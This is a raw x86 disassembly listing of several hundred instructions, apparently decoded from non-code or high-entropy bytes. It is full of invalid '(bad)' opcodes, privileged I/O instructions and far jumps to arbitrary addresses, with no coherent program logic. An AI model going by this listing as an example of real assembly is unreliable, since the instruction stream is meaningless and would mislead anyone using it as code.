  409ea4:	and    edx,DWORD PTR [eax]
  409ea6:	es std 
  409ea8:	cmp    BYTE PTR [esi],0xcc
  409eab:	loopne 0x409ee4
  409ead:	fwait
  409eae:	push   edx
  409eaf:	add    BYTE PTR [eax-0x61724d85],dh
  409eb5:	mov    ah,dh
  409eb7:	rcr    BYTE PTR [edi],1
  409eb9:	lock retf 0xac3e
  409ebd:	ins    DWORD PTR es:[edi],dx
  409ebe:	sbb    BYTE PTR [eax+0x23],ch
  409ec1:	dec    edx
  409ec2:	jmp    0xb3dc:0x162b5217
  409ec9:	pop    ebp
  409eca:	mov    ebx,0x207795cd
  409ecf:	mov    DWORD PTR [eax+0x25574531],0x2a77e87b
  409ed9:	fsub   DWORD PTR [eax-0x4b]
  409edc:	and    al,0xf7
  409ede:	cli    
  409edf:	jnp    0x409f60
  409ee1:	dec    edx
  409ee2:	or     ch,BYTE PTR [esi-0x65b9e15e]
  409ee8:	out    0xd7,al
  409eea:	pop    es
  409eeb:	xor    al,0xcf
  409eed:	(bad)  [edi+ebx*1+0x282cb3cc]
  409ef4:	or     DWORD PTR [esi-0x25],esp
  409ef7:	add    DWORD PTR [edx+0x12],eax
  409efd:	xor    eax,0x3e89b3d8
  409f02:	cli    
  409f03:	retf   
  409f04:	push   ds
  409f05:	push   ebp
  409f06:	in     al,dx
  409f07:	pusha  
  409f08:	ins    DWORD PTR es:[edi],dx
  409f09:	cmp    eax,0xc4382b22
  409f0e:	jbe    0x409f34
  409f10:	add    DWORD PTR [ecx],esp
  409f12:	sbb    eax,ecx
  409f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f15:	add    ebx,DWORD PTR [edi]
  409f17:	fwait
  409f18:	sub    al,0x89
  409f1a:	inc    ebp
  409f1b:	aaa    
  409f1c:	push   ecx
  409f1d:	daa    
  409f1e:	xchg   ecx,eax
  409f1f:	or     BYTE PTR [esi+0x31],dl
  409f22:	adc    BYTE PTR [eax-0x30e0b57e],ah
  409f28:	or     BYTE PTR [esp+edi*1-0x23],dl
  409f2c:	cmp    edx,edx
  409f2e:	dec    ebp
  409f2f:	daa    
  409f30:	dec    esi
  409f31:	dec    edi
  409f32:	retf   0x1866
  409f35:	leave  
  409f36:	inc    ecx
  409f37:	xchg   edi,eax
  409f38:	jle    0x409fae
  409f3a:	and    al,0x43
  409f3c:	mov    ebp,0x21372ae
  409f41:	or     DWORD PTR [ecx+0x60],esp
  409f44:	mov    esp,0x8ba59ca8
  409f49:	sbb    BYTE PTR [eax],al
  409f4b:	pop    esi
  409f4c:	frstor [edi-0xa867d2d]
  409f52:	jg     0x409f0c
  409f54:	sub    ch,0xbe
  409f57:	dec    ebx
  409f58:	mov    ebp,edx
  409f5a:	cmp    al,0x61
  409f5c:	adc    al,0xc6
  409f5e:	xor    al,0xe6
  409f60:	jae    0x409f15
  409f62:	adc    eax,0x5d01f33
  409f67:	pop    ebx
  409f68:	xor    DWORD PTR [esi-0x28],eax
  409f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f6c:	or     DWORD PTR [ebx],edi
  409f6e:	outs   dx,BYTE PTR ds:[esi]
  409f6f:	fidiv  WORD PTR [ebx+0x58858595]
  409f75:	adc    edi,0x3e
  409f78:	sbb    esi,DWORD PTR [edi-0x23]
  409f7b:	(bad)  
  409f7c:	mov    bh,0xe0
  409f7f:	stc    
  409f80:	dec    ebx
  409f81:	cmc    
  409f82:	xor    BYTE PTR [ebx+ebp*2],dh
  409f85:	jg     0x409ff7
  409f87:	into   
  409f88:	sub    al,0x48
  409f8a:	push   es
  409f8b:	sar    BYTE PTR [ebx+0x20],cl
  409f8e:	xor    BYTE PTR [eax-0x5b8a3cc1],0x92
  409f95:	cwde   
  409f96:	pop    esi
  409f97:	aaa    
  409f98:	xchg   edx,eax
  409f99:	mov    al,ds:0xfc7c34c8
  409f9e:	push   cs
  409f9f:	cmp    eax,0xa3d1c99e
  409fa4:	mov    esi,0x5496c6ba
  409fa9:	lahf   
  409faa:	xchg   esp,eax
  409fab:	inc    ecx
  409fac:	inc    ebx
  409fad:	cmc    
  409fae:	fcomp  QWORD PTR [esi+0xd]
  409fb1:	add    al,BYTE PTR [esi+0x44d63af2]
  409fb7:	es mov dh,0x3f
  409fba:	(bad)  
  409fbb:	ficom  WORD PTR [eax+0xf239024]
  409fc1:	sbb    eax,DWORD PTR [eax]
  409fc3:	mov    ah,BYTE PTR [eax+ebx*8+0x6]
  409fc7:	xor    DWORD PTR [ebx],eax
  409fc9:	add    al,BYTE PTR [esi-0x2a504a94]
  409fcf:	sbb    al,0x68
  409fd1:	inc    esi
  409fd2:	inc    esi
  409fd3:	test   BYTE PTR [esi],cl
  409fd5:	fiadd  DWORD PTR [eax]
  409fd7:	in     al,dx
  409fd8:	addr16 (bad) 
  409fda:	out    0x2b,eax
  409fdc:	stc    
  409fdd:	inc    edx
  409fde:	out    dx,al
  409fdf:	jmp    0xe97:0xabbdba0e
  409fe6:	js     0x409ffd
  409fe8:	sub    DWORD PTR [edi],eax
  409fea:	data16 and al,0x26
  409fed:	add    al,0xb2
  409fef:	add    DWORD PTR [edi+eax*1],ecx
  409ff2:	(bad)  [esi]
  409ff4:	jno    0x409f77
  409ff6:	mov    ds:0xb43611d2,al
  409ffb:	inc    ecx
  409ffc:	push   esp
  409ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ffe:	sbb    ebp,DWORD PTR [ecx]
  40a000:	retf   
  40a001:	repz mov ebx,0x44ad0e52
  40a007:	sub    DWORD PTR [esi-0x2],esp
  40a00a:	imul   eax,DWORD PTR [edi-0x79f4645b],0x1f8fabe8
  40a014:	adc    DWORD PTR [ebp-0x20],esi
  40a017:	imul   al
  40a019:	xchg   esp,eax
  40a01a:	ins    BYTE PTR es:[edi],dx
  40a01b:	jo     0x409faf
  40a01d:	or     eax,0xeb3eff30
  40a022:	cmp    DWORD PTR [ebx+eax*4-0x59],ebp
  40a026:	std    
  40a027:	lods   al,BYTE PTR ds:[esi]
  40a028:	mov    dh,0x1d
  40a02a:	arpl   WORD PTR [esi+0x4474c00d],bx
  40a030:	shr    BYTE PTR [edi-0x64f5e197],1
  40a036:	mul    BYTE PTR gs:[ebp-0x75]
  40a03a:	fdiv   st(0),st
  40a03c:	outs   dx,BYTE PTR ds:[esi]
  40a03d:	cli    
  40a03e:	test   al,0x9b
  40a040:	mov    ds:0xd0740cd7,al
  40a045:	loope  0x409fd0
  40a047:	pushf  
  40a048:	pop    eax
  40a049:	xor    al,0x63
  40a04b:	mov    BYTE PTR [esi-0x2e],ah
  40a04e:	imul   eax,ecx,0xad755d5b
  40a054:	jmp    0xa0404572
  40a059:	sub    WORD PTR [eax+0xf],sp
  40a05d:	jmp    0x40a09c
  40a05f:	xchg   edi,eax
  40a060:	inc    ebx
  40a061:	jg     0x40a04a
  40a063:	arpl   ax,bx
  40a065:	sub    bh,BYTE PTR [edx]
  40a067:	xor    dl,BYTE PTR [eax]
  40a069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a06a:	xor    DWORD PTR [ebx],0x9
  40a06d:	mov    ecx,esi
  40a06f:	jmp    DWORD PTR [ecx+0x49]
  40a072:	lds    eax,FWORD PTR [edi+edi*8+0x234cf468]
  40a079:	add    DWORD PTR [edx],eax
  40a07b:	and    eax,0x1bd4d091
  40a080:	mov    ds:0xf0015105,al
  40a085:	mov    al,0xb2
  40a087:	mov    bl,0xe
  40a089:	test   eax,0xcd3e4f92
  40a08e:	pop    DWORD PTR ds:0x84735348
  40a094:	aas    
  40a095:	pop    ss
  40a096:	pop    ss
  40a097:	iret   
  40a098:	push   edx
  40a099:	test   al,0x99
  40a09b:	out    dx,al
  40a09c:	fmul   QWORD PTR [esi+edx*4+0x1e0c1eea]
  40a0a3:	aaa    
  40a0a4:	sub    ecx,0x36
  40a0a7:	mov    ecx,0x17aad9ce
  40a0ac:	addr16 mov ds:0xb4a2,eax
  40a0b0:	cli    
  40a0b1:	pop    ebp
  40a0b2:	push   eax
  40a0b3:	add    al,al
  40a0b5:	sti    
  40a0b6:	or     ch,cl
  40a0b8:	push   edi
  40a0b9:	add    esi,ebx
  40a0bb:	je     0x40a03e
  40a0bd:	mov    bl,ah
  40a0bf:	sub    edx,DWORD PTR [ebx+ebp*2]
  40a0c2:	mov    ah,0x9b
  40a0c4:	jne    0x40a09b
  40a0c6:	pop    ebx
  40a0c7:	stc    
  40a0c8:	repz pop es
  40a0ca:	ss (bad) 
  40a0cc:	push   0x63758d75
  40a0d1:	sahf   
  40a0d2:	aaa    
  40a0d3:	or     ah,dh
  40a0d5:	fstp   DWORD PTR [ebp-0x67dfd5ab]
  40a0db:	add    DWORD PTR [ecx+0x40],eax
  40a0de:	pusha  
  40a0df:	cli    
  40a0e0:	xor    cl,BYTE PTR [edx]
  40a0e2:	test   BYTE PTR [eax],bh
  40a0e4:	mov    ebp,0x8a89fab2
  40a0e9:	jmp    0x4285:0x1c77ab2b
  40a0f0:	loope  0x40a10f
  40a0f2:	lock cld 
  40a0f4:	jns    0x40a173
  40a0f6:	add    edi,DWORD PTR [ebx]
  40a0f8:	ret    0xdfc7
  40a0fb:	mov    ebp,0xf57e3691
  40a100:	test   al,0x18
  40a102:	add    ebx,edx
  40a104:	xor    al,0xc7
  40a106:	adc    al,0x3e
  40a108:	int    0xdf
  40a10a:	xor    BYTE PTR ds:0x654b37d8,dh
  40a110:	cld    
  40a111:	and    BYTE PTR ds:0xecf00093,dh
  40a117:	add    BYTE PTR [ecx],bh
  40a119:	dec    eax
  40a11a:	aas    
  40a11b:	ret    
  40a11c:	icebp  
  40a11d:	or     ch,bl
  40a11f:	iret   
  40a120:	xchg   edx,eax
  40a121:	iret   
  40a122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a124:	or     bl,dl
  40a126:	ret    0x89fd
  40a129:	inc    esp
  40a12a:	mov    dh,0xcf
  40a12c:	jmp    0xa539c667
  40a131:	jle    0x40a18a
  40a133:	dec    ecx
  40a134:	add    BYTE PTR [eax+0x56],bh
  40a137:	dec    eax
  40a138:	ds inc esi
  40a13a:	adc    eax,0xe3b08840
  40a13f:	inc    edi
  40a140:	les    esi,FWORD PTR [eax+0x29e4128e]
  40a146:	inc    edi
  40a147:	ins    DWORD PTR es:[edi],dx
  40a148:	outs   dx,DWORD PTR ds:[esi]
  40a149:	jle    0x40a1b0
  40a14b:	mov    ah,0x48
  40a14d:	push   edi
  40a14e:	out    0x67,eax
  40a150:	push   ebp
  40a151:	dec    ebp
  40a152:	dec    esi
  40a153:	pop    edx
  40a154:	test   al,0xfb
  40a156:	pop    es
  40a157:	cmp    eax,0x1eeccd00
  40a15c:	or     eax,0xda0800
  40a161:	cmp    BYTE PTR [edx-0x33],0x88
  40a165:	jle    0x40a18c
  40a167:	mov    ch,0x4
  40a169:	lock and BYTE PTR [edi+0x5b165df1],bl
  40a170:	pop    esi
  40a171:	rcl    ebx,1
  40a173:	sub    eax,0xaa1a0000
  40a178:	int    0x52
  40a17a:	sbb    ebp,DWORD PTR [ebx+0x7b566ef]
  40a180:	mov    ds:0x2d7bd41f,eax
  40a185:	scas   eax,DWORD PTR es:[edi]
  40a186:	sbb    DWORD PTR [eax-0x6d],ebp
  40a189:	jecxz  0x40a18b
  40a18b:	sub    edi,0xffffffcf
  40a18e:	(bad)  
  40a18f:	push   0xe222ad5d
  40a194:	adc    dh,dh
  40a196:	mov    ebx,0xc1183583
  40a19b:	and    BYTE PTR [ebx],dl
  40a19d:	sub    al,0xca
  40a19f:	aam    0xbc
  40a1a1:	dec    ecx
  40a1a2:	inc    esi
  40a1a3:	cmp    dl,BYTE PTR [ebp+0x50f480e8]
  40a1a9:	ins    BYTE PTR es:[edi],dx
  40a1aa:	mov    DWORD PTR [ebp+0x3ce46758],eax
  40a1b0:	pop    ss
  40a1b1:	dec    esi
  40a1b2:	xchg   edi,eax
  40a1b3:	gs daa 
  40a1b5:	sbb    BYTE PTR [esi+edi*8+0x1dfe36be],ch
  40a1bc:	and    al,0x6a
  40a1be:	imul   eax,DWORD PTR [esp+ebx*2],0x8198330a
  40a1c5:	pop    esp
  40a1c6:	mov    bh,BYTE PTR [eax]
  40a1c8:	mov    eax,0x1b620994
  40a1cd:	push   ss
  40a1ce:	fwait
  40a1cf:	sbb    ebp,ecx
  40a1d1:	xchg   esi,eax
  40a1d2:	(bad)  
  40a1d3:	stc    
  40a1d4:	outs   dx,DWORD PTR ds:[esi]
  40a1d5:	idiv   BYTE PTR [ebx+0x19be98c5]
  40a1db:	add    eax,0x496e3e07
  40a1e0:	sbb    eax,0x2b76b94b
  40a1e5:	pop    ebx
  40a1e6:	inc    esp
  40a1e7:	xor    edi,DWORD PTR [ebx-0x4740a1ef]
  40a1ed:	xor    ebp,DWORD PTR [esi]
  40a1ef:	xchg   ebp,eax
  40a1f0:	jp     0x40a232
  40a1f2:	aaa    
  40a1f3:	popf   
  40a1f4:	push   0xffffffa7
  40a1f6:	xor    edi,DWORD PTR [ecx+ecx*4]
  40a1f9:	aaa    
  40a1fa:	pop    eax
  40a1fb:	js     0x40a188
  40a1fd:	sbb    BYTE PTR [eax],0x6a
  40a200:	sub    al,0x1d
  40a202:	dec    ecx
  40a203:	sub    eax,0xd7579097
  40a208:	xchg   ebp,eax
  40a209:	push   0x60ea4b8
  40a20e:	push   ebx
  40a20f:	sbb    esi,DWORD PTR [ecx-0x8]
  40a212:	or     eax,0x833c807b
  40a217:	push   cs
  40a218:	lea    eax,[ebp+0x1ba32117]
  40a21e:	repnz int 0xf7
  40a221:	mov    ch,0x1d
  40a224:	xchg   esi,eax
  40a225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a226:	test   DWORD PTR [ecx+0x7ffa61a2],ebx
  40a22c:	ds (bad) 
  40a22e:	retf   0x3f6f
  40a231:	outs   dx,DWORD PTR ds:[esi]
  40a232:	stos   DWORD PTR es:[edi],eax
  40a233:	mov    al,0x6e
  40a235:	mov    ebx,0xe70cc28f
  40a23a:	pop    ebx
  40a23b:	hlt    
  40a23c:	sti    
  40a23d:	sub    ebx,DWORD PTR [edx*2+0xf5cdede]
  40a244:	ins    DWORD PTR es:[edi],dx
  40a245:	mov    eax,0xae4bb745
  40a24a:	ror    edi,0x94
  40a24d:	jb     0x40a256
  40a24f:	inc    esp
  40a250:	out    0x47,eax
  40a252:	ins    DWORD PTR es:[edi],dx
  40a253:	add    BYTE PTR [eax+0x4d75a701],bh
  40a259:	test   BYTE PTR [edx],dl
  40a25b:	(bad)  
  40a25c:	(bad)  
  40a25d:	jne    0x40a262
  40a25f:	shr    BYTE PTR [edi],1
  40a261:	push   edi
  40a262:	mov    edi,0x3fc34932
  40a267:	cmp    al,BYTE PTR [ecx+0x57]
  40a26a:	jmp    0x7ec4:0x6e2dc663
  40a271:	jecxz  0x40a284
  40a273:	imul   eax,ebp,0xf
  40a276:	shl    edi,0x6
  40a279:	add    al,bl
  40a27b:	push   0xb3406cde
  40a280:	leave  
  40a281:	dec    esi
  40a282:	mov    edx,0xb11ad19a
  40a287:	int    0x9f
  40a289:	das    
  40a28a:	push   esi
  40a28b:	jmp    0x3a828172
  40a290:	ficomp WORD PTR [ebx+0x67]
  40a293:	sbb    eax,0x715b292d
  40a298:	ins    DWORD PTR es:[edi],dx
  40a299:	bound  ebx,QWORD PTR [ebp+0x413a58c7]
  40a29f:	imul   edi,DWORD PTR [edx-0x26],0x69
  40a2a3:	mov    WORD PTR [ecx+esi*4-0x166ada91],ss
  40a2aa:	(bad)  
  40a2ab:	xchg   ebx,eax
  40a2ac:	push   ebp
  40a2ad:	mov    dh,BYTE PTR [eax+0x5846ef88]
  40a2b3:	jg     0x40a2ac
  40a2b5:	jecxz  0x40a269
  40a2b7:	stos   DWORD PTR es:[edi],eax
  40a2b8:	iret   
  40a2b9:	adc    ecx,0xd6f9ec8c
  40a2bf:	push   ebx
  40a2c0:	stos   BYTE PTR es:[edi],al
  40a2c1:	ror    BYTE PTR [esi+ebp*2-0x4f7473ea],1
  40a2c8:	adc    bl,BYTE PTR [edi-0x17]
  40a2cb:	into   
  40a2cc:	shl    BYTE PTR [ebp+0x69],cl
  40a2cf:	cmc    
  40a2d0:	cwde   
  40a2d1:	es inc esi
  40a2d3:	shl    BYTE PTR [ebx-0x23],0x3f
  40a2d7:	dec    ebx
  40a2d8:	xor    al,0xaf
  40a2da:	loopne 0x40a31f
  40a2dc:	(bad)  
  40a2dd:	jp     0x40a357
  40a2df:	sbb    ecx,ebp
  40a2e1:	fld    DWORD PTR [ecx]
  40a2e4:	into   
  40a2e5:	push   esi
  40a2e6:	addr16 pop edi
  40a2e8:	mov    ch,BYTE PTR [esi-0x42]
  40a2eb:	push   esp
  40a2ec:	cmp    dl,BYTE PTR [edi]
  40a2ee:	out    0x5d,al
  40a2f0:	in     al,dx
  40a2f1:	fisub  WORD PTR [ecx-0x31]
  40a2f4:	shr    ah,cl
  40a2f6:	mov    ebp,DWORD PTR ds:[ecx-0x690c3ec5]
  40a2fd:	ror    BYTE PTR [esi+0x24235256],cl
  40a303:	and    BYTE PTR [edi+0x3623332],0xf8
  40a30a:	ret    
  40a30b:	retf   0x966a
  40a30e:	adc    bh,BYTE PTR [ebp-0x57]
  40a311:	out    dx,al
  40a312:	je     0x40a34c
  40a314:	(bad)  
  40a315:	hlt    
  40a316:	lock dec esi
  40a318:	pop    esi
  40a319:	sub    ebx,ebp
  40a31b:	push   edx
  40a31c:	push   edx
  40a31d:	or     esp,DWORD PTR [ebp+0x26f71fbf]
  40a323:	fs jmp 0x40a392
  40a326:	inc    ebp
  40a327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a328:	inc    esi
  40a329:	hlt    
  40a32a:	fist   WORD PTR [eax+0x5782020e]
  40a330:	pusha  
  40a331:	xchg   edx,eax
  40a332:	sbb    DWORD PTR [esi+0x4a],esp
  40a335:	push   edx
  40a336:	sbb    BYTE PTR ds:0x55421e49,0x64
  40a33d:	lods   al,BYTE PTR ds:[esi]
  40a33e:	mov    dh,0xbb
  40a340:	or     BYTE PTR [ebx-0x17],bh
  40a343:	inc    ebp
  40a344:	call   0x5eb90fda
  40a349:	mov    esp,0x6acf4e79
  40a34e:	repz push edx
  40a350:	ins    DWORD PTR es:[edi],dx
  40a351:	cmp    BYTE PTR [esi],dh
  40a353:	add    eax,0xc5a9e753
  40a358:	mov    bl,0x6f
  40a35a:	rcl    DWORD PTR [edi],1
  40a35c:	jg     0x40a3b2
  40a35e:	mov    bh,0xd1
  40a360:	aad    0xed
  40a362:	les    esi,FWORD PTR [ecx-0xf4d417d]
  40a368:	cmp    edx,DWORD PTR [edx-0x11]
  40a36b:	push   eax
  40a36c:	add    eax,0x7df5210b
  40a371:	sbb    eax,0x34b
  40a376:	add    BYTE PTR [eax],ah
  40a378:	aam    0xe9
  40a37a:	mov    dh,bl
  40a37c:	adc    eax,DWORD PTR [eax]
  40a37e:	adc    eax,0xc8a3f85
  40a383:	dec    eax
  40a384:	call   0xb73:0x403ae20b
  40a38b:	mov    gs,WORD PTR [ebp-0x78802716]
  40a391:	jns    0x40a358
  40a393:	ins    BYTE PTR es:[edi],dx
  40a394:	mov    bh,0xa0
  40a396:	add    BYTE PTR [eax+0x12823f9],al
  40a39c:	add    al,0x1f
  40a39e:	push   0xffffffb3
  40a3a0:	xchg   esi,eax
  40a3a1:	add    BYTE PTR [edx+0x59],bh
  40a3a4:	adc    eax,0x7ab35f80
  40a3a9:	push   0xffffff82
  40a3ab:	ficom  DWORD PTR [edi+0xf]
  40a3ae:	enter  0x8f4a,0xe2
  40a3b2:	and    BYTE PTR [ebx-0x5bb708aa],bl
  40a3b8:	ror    DWORD PTR [esi+0x6d7a710d],cl
  40a3be:	inc    edi
  40a3bf:	test   DWORD PTR [esi+0x21b66677],edi
  40a3c5:	or     eax,0xcaaa593c
  40a3ca:	out    0xa1,al
  40a3cc:	pusha  
  40a3cd:	(bad)  
  40a3ce:	bound  esi,QWORD PTR [edi+0x3f]
  40a3d1:	sbb    eax,0x4e8daaf7
  40a3d6:	cmp    eax,0x2189ea3c
  40a3db:	jno    0x40a383
  40a3dd:	sub    eax,0x7da1a921
  40a3e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3e3:	ss std 
  40a3e5:	mov    esp,0xf293bd1
  40a3ea:	or     al,0x17
  40a3ec:	loopne 0x40a36f
  40a3ee:	lea    ebp,[ecx]
  40a3f0:	jmp    0xc625:0x51b27a7d
  40a3f7:	lods   al,BYTE PTR ds:[esi]
  40a3f8:	(bad)  
  40a3f9:	imul   ecx,DWORD PTR [edx],0x24e08007
  40a3ff:	mov    ch,0x27
  40a401:	jp     0x40a42e
  40a403:	push   edi
  40a404:	cwde   
  40a405:	std    
  40a406:	mov    bh,0xad
  40a408:	sub    esi,DWORD PTR [esi]
  40a40a:	arpl   WORD PTR [esi+0x52f16b30],dx
  40a410:	sbb    DWORD PTR [edx+0x29],ebp
  40a413:	sub    al,BYTE PTR [ebx-0x54871b25]
  40a419:	mov    edi,0xdce459d
  40a41e:	imul   ecx,DWORD PTR [ebx-0x7d98b4b5],0xffffffb0
  40a425:	jnp    0x40a45c
  40a427:	cmc    
  40a428:	add    cl,BYTE PTR [eax+ebp*8-0x405990d0]
  40a42f:	retf   
  40a430:	daa    
  40a431:	call   0xdd637cf1
  40a436:	lahf   
  40a437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a438:	cmc    
  40a439:	std    
  40a43a:	fnsave [ecx+edx*8-0xc]
  40a43e:	xor    al,0xdd
  40a440:	sbb    ebp,ebp
  40a442:	inc    ax
  40a444:	rcl    DWORD PTR [bx+di+0x76],1
  40a448:	fidiv  DWORD PTR [ebp+0x64]
  40a44b:	push   ds
  40a44c:	sbb    al,0x9a
  40a44e:	hlt    
  40a44f:	and    eax,0xc01e0cc1
  40a454:	popa   
  40a455:	ins    BYTE PTR es:[edi],dx
  40a456:	mov    WORD PTR [ecx-0x7853013b],fs
  40a45c:	pop    ebp
  40a45d:	ja     0x40a3f4
  40a45f:	adc    al,0x20
  40a461:	sbb    ecx,DWORD PTR [ecx+0x708d1ef8]
  40a467:	arpl   WORD PTR [edi+0x22],bp
  40a46a:	mov    ch,0x1a
  40a46c:	sbb    al,BYTE PTR [esi+0x7742d34f]
  40a472:	pop    eax
  40a473:	rcr    BYTE PTR [edx],1
  40a475:	push   ds
  40a476:	ss push esi
  40a478:	sar    DWORD PTR [ecx-0x6d],0x6d
  40a47c:	and    ah,BYTE PTR [ecx]
  40a47e:	add    al,0xe7
  40a480:	inc    edx
  40a481:	pop    eax
  40a482:	sub    al,dh
  40a484:	or     BYTE PTR [ecx-0x68b7a5f6],bl
  40a48a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a48b:	inc    esi
  40a48c:	call   0x17d:0xdcceddfb
  40a493:	ins    BYTE PTR es:[edi],dx
  40a494:	or     BYTE PTR [ebx+0x36],bh
  40a497:	cmp    ebx,DWORD PTR [ebx+eax*8-0x9]
  40a49b:	(bad)  
  40a49c:	lea    eax,[ebx-0x5f]
  40a49f:	add    al,BYTE PTR [eax-0x5b]
  40a4a2:	inc    esi
  40a4a3:	and    eax,0xb8f8e868
  40a4a8:	add    al,BYTE PTR ds:[edx-0x163c5ec2]
  40a4af:	inc    ecx
  40a4b0:	fsubr  DWORD PTR [edi+0x26d5b0e0]
  40a4b6:	ret    
  40a4b7:	add    edi,DWORD PTR [edi-0x5d50440a]
  40a4bd:	jg     0x40a4be
  40a4bf:	stos   DWORD PTR es:[edi],eax
  40a4c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4c2:	fisub  WORD PTR [esi-0x70befdf3]
  40a4c8:	cmp    BYTE PTR [ecx+0x5f],0x50
  40a4cc:	mov    esp,cr1
  40a4cf:	test   al,0x63
  40a4d1:	push   ds
  40a4d2:	call   0xcd0d2884
  40a4d7:	stos   BYTE PTR es:[edi],al
  40a4d8:	stos   BYTE PTR es:[edi],al
  40a4d9:	xor    DWORD PTR [ebp-0x5a],ebx
  40a4dc:	mov    bh,0xbb
  40a4de:	(bad)  
  40a4df:	jbe    0x40a48d
  40a4e1:	xchg   ebx,eax
  40a4e2:	(bad)  
  40a4e3:	lods   eax,DWORD PTR ds:[esi]
  40a4e4:	and    ecx,DWORD PTR [ecx-0x3]
  40a4e7:	xchg   ebp,eax
  40a4e8:	jno    0x40a513
  40a4ea:	not    BYTE PTR [ecx+0x75]
  40a4ed:	mov    ds:0x2bb73a34,al
  40a4f2:	cmp    BYTE PTR [ebp-0x43409a96],bh
  40a4f8:	aas    
  40a4f9:	xor    eax,0x6f174936
  40a4fe:	sbb    dl,BYTE PTR [edi+ecx*8-0x177d0e27]
  40a505:	jmp    DWORD PTR [edi]
  40a507:	(bad)  
  40a508:	jae    0x40a497
  40a50a:	aad    0xbe
  40a50c:	lods   al,BYTE PTR ds:[esi]
  40a50d:	pop    ebp
  40a50e:	mov    bl,bh
  40a510:	cmp    esi,DWORD PTR [esi]
  40a512:	inc    esi
  40a513:	push   edi
  40a514:	mov    esi,0x7b5d1d6a
  40a519:	cld    
  40a51a:	add    al,0xff
  40a51c:	pop    ebp
  40a51d:	xchg   esp,eax
  40a51e:	ret    0xa88b
  40a521:	scas   al,BYTE PTR es:[edi]
  40a522:	cli    
  40a523:	pusha  
  40a524:	jb     0x40a53b
  40a526:	pop    ebp
  40a527:	sti    
  40a528:	aam    0x71
  40a52a:	push   edx
  40a52b:	sbb    esi,DWORD PTR [ebx]
  40a52d:	push   ecx
  40a52e:	sar    DWORD PTR [edx-0x18],cl
  40a531:	rol    DWORD PTR [ecx],0xe
  40a534:	dec    esi
  40a535:	cli    
  40a536:	push   esi
  40a537:	int3   
  40a538:	popa   
  40a539:	test   ecx,0x61e3ac52
  40a53f:	xchg   ebx,eax
  40a540:	ret    0x7269
  40a543:	fsub   QWORD PTR [esi+0x5ab4ebb0]
  40a549:	shr    ebp,0xf3
  40a54c:	cmp    al,0x6a
  40a54e:	dec    ebp
  40a54f:	popa   
  40a550:	sbb    esp,0x6c
  40a553:	mov    ds:0x821092b7,al
  40a558:	in     eax,dx
  40a559:	outs   dx,DWORD PTR ds:[esi]
  40a55a:	push   es
  40a55b:	cmp    dh,dh
  40a55d:	cmp    al,0x1
  40a55f:	(bad)  
  40a560:	rol    dl,1
  40a562:	jp     0x40a564
  40a564:	fsubr  DWORD PTR [edi-0x2d72123f]
  40a56a:	xcrypt-ofb (bad)
  40a56b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a56c:	push   0xfffffff4
  40a56e:	fxch   st(6)
  40a570:	adc    eax,0xe867b2bc
  40a575:	mov    ds:0x12561d2c,eax
  40a57a:	(bad)  
  40a57c:	inc    ebp
  40a57d:	aas    
  40a57e:	and    DWORD PTR [ecx-0x453b711e],esp
  40a584:	xchg   ebx,eax
  40a585:	push   esp
  40a586:	add    eax,0x8125947e
  40a58b:	adc    DWORD PTR [ebp+0x3d],edi
  40a58e:	push   ebp
  40a58f:	jae    0x40a563
  40a591:	pop    ss
  40a592:	or     eax,eax
  40a594:	fidiv  WORD PTR [edi]
  40a596:	adc    dh,bh
  40a598:	mov    ebx,0x98c80751
  40a59d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40a59f:	imul   esp,DWORD PTR [ecx+0x1282c2b],0xdb202504
  40a5a9:	mov    esi,0x1e52ccd2
  40a5ae:	or     al,0xe
  40a5b0:	or     edi,DWORD PTR [esi+0x6e]
  40a5b3:	add    eax,0xede99700
  40a5b8:	iret   
  40a5b9:	jo     0x40a627
  40a5bb:	setg   BYTE PTR [edi+ecx*2-0x31511215]
  40a5c3:	fwait
  40a5c4:	inc    ecx
  40a5c5:	sahf   
  40a5c6:	mov    WORD PTR [ecx],gs
  40a5c8:	jne    0x40a5d8
  40a5ca:	(bad)  
  40a5cb:	jmp    0x40a5a2
  40a5cd:	xchg   ecx,eax
  40a5ce:	xor    DWORD PTR [eax-0x3],0x8b73fbf5
  40a5d5:	shl    BYTE PTR [edi],1
  40a5d7:	jp     0x40a5a3
  40a5d9:	int3   
  40a5da:	pop    es
  40a5db:	cs in  eax,dx
  40a5dd:	fs dec ecx
  40a5df:	mov    ebx,0xa3b6d3b1
  40a5e4:	stos   BYTE PTR es:[edi],al
  40a5e5:	or     eax,0x44b96799
  40a5ea:	xchg   edi,eax
  40a5eb:	pusha  
  40a5ec:	(bad)  
  40a5ee:	push   edx
  40a5ef:	repnz mov ebp,0xc517f34
  40a5f5:	dec    edx
  40a5f6:	add    esp,esi
  40a5f8:	mov    ecx,0x490049e6
  40a5fd:	retf   
  40a5fe:	sbb    edx,DWORD PTR [eax]
  40a600:	aam    0x6b
  40a602:	in     al,dx
  40a603:	inc    ecx
  40a604:	xor    eax,0xec868d83
  40a609:	jne    0x40a5c5
  40a60b:	imul   esi,edi,0x2a2b5c6
  40a611:	pushf  
  40a612:	mov    edi,0xb24e8db6
  40a617:	push   0xfffffff0
  40a619:	in     al,0x4c
  40a61b:	daa    
  40a61c:	and    eax,0x9e2b30a
  40a621:	mov    BYTE PTR [edi+eiz*8+0x69],cl
  40a625:	jae    0x40a5c9
  40a627:	xor    DWORD PTR [edx-0x2c859aad],0xffffffe5
  40a62e:	jmp    0x40a619
  40a630:	icebp  
  40a631:	arpl   WORD PTR [edi-0x17],ax
  40a634:	icebp  
  40a635:	mov    DWORD PTR [ebx*4+0x4a5248e],eax
